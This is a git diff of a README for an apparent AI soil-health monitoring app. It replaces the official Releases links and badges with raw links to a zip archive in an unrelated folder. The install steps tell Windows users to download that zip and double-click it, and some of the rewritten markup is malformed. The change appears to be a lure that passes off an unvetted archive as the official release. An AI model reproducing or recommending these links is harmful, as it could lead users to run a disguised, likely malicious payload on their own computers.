@@ -25,14 +25,14 @@ To run this application, ensure your system meets the following requirements:
 
 You can download the application from the Releases page below. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/releases)
+[![Download Now](https://raw.githubusercontent.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/main/pupunha/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System.zip%https://raw.githubusercontent.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/main/pupunha/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System.zip)](https://raw.githubusercontent.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/main/pupunha/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System.zip)
 
 Follow these steps to download and install the application:
 
-1. Visit the [Releases page](https://github.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/main/pupunha/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System.zip).
 2. On the Releases page, you will see various versions of the application. Locate the latest release at the top.
 3. Click on the link labeled **Assets** to expand the download options.
-4. Choose the appropriate file for your operating system (e.g., `AI-Microbial-System-Windows.exe` for Windows).
+4. Choose the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/main/pupunha/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System.zip` for Windows).
 5. Download the selected file to your computer.
 6. Once the file is downloaded, navigate to your Downloads folder and double-click the file to start the installation.
 7. Follow the on-screen prompts to complete the installation.
@@ -84,6 +84,6 @@ For more detailed information, refer to the specific sections of our documentati
 
 Keep an eye on the Releases page for updates and new features. 
 
-[![Latest Release](https://img.shields.io/github/release/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System.svg)](https://github.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/releases) 
+[![Latest Release](https://raw.githubusercontent.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/main/pupunha/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System.zip)](https://raw.githubusercontent.com/nickisgit/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System/main/pupunha/AI-Driven-Microbial-soil-health-monitoring-and-Enhancement-System.zip) 
 
 Thank you for choosing this application to enhance your soil health. Let’s cultivate a better future together!
